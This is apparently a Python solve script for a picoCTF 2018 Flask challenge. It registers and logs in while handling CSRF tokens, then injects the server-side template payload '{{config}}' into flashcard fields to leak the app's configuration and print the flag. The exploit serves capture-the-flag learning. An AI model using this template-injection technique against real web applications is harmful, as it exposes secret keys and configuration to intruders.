from requests import *
from bs4 import BeautifulSoup

username_and_password = '123'

def get_token(text):
    soup = BeautifulSoup(text , 'html.parser')
    token = soup.find('input' , {'id' : 'csrf_token'}).get('value')
    return token

s = Session()
url = 'http://2018shell.picoctf.com:17991/register'
r = s.get(url)
token = get_token(r.text)
data = {
    'csrf_token' : token,
    'username' : username_and_password,
    'password' : username_and_password,
    'password2' : username_and_password,
    'submit' : 'Register'
}

r = s.post(url , data=data)
token = get_token(r.text)

url = 'http://2018shell.picoctf.com:17991/login'
data = {
    'csrf_token' : token,
    'username' : username_and_password,
    'password' : username_and_password,
    'submit' : 'Sign In'
}

r = s.post(url , data=data)

url = 'http://2018shell.picoctf.com:17991/create_card'
headers = {
    'Referer' : 'http://2018shell.picoctf.com:17991/index',
    'Host' : '2018shell.picoctf.com:17991'
}
create = '{{config}}'
data = {
    'csrf_token' : token,
    'question' : create,
    'answer' : create,
    'submit' : 'Create'
}

r = s.post(url , data=data , headers=headers)
token = get_token(r.text)

url = 'http://2018shell.picoctf.com:17991/list_cards'
r = s.get(url)
pos = r.text.find('picoCTF{')

while(True):
    print(r.text[pos] , end='')
    if (r.text[pos] == '}'):
        print()
        break
    pos += 1
